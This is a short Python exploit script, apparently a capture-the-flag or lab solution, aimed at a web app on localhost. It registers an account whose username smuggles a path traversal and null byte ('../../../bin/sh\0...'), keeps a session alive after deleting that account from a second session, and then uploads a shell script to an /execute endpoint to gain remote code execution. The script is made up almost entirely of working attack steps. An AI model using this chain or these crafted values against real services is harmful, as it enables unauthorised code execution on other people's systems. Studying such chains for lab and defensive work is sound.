import requests
import time

HOST = "http://localhost:8080"

data_user = {
    "username": "../../../bin/sh\0random1",
    "password": "rahasiaBangetzzz"
}

sesi = [requests.session(), requests.session()]

print("Creating account...")
sesi[0].post(f"{HOST}/auth/register", data=data_user)
sesi[0].post(f"{HOST}/auth/login", data=data_user)

print("Deleting account...")
sesi[1].post(f"{HOST}/auth/login", data=data_user)
sesi[1].get(f"{HOST}/account/delete")
time.sleep(5)

print("Execute RCE...")
sesi[0].post(f"{HOST}/execute", data={"program": "base64"}, files={"file": open("script.sh", "rb")})
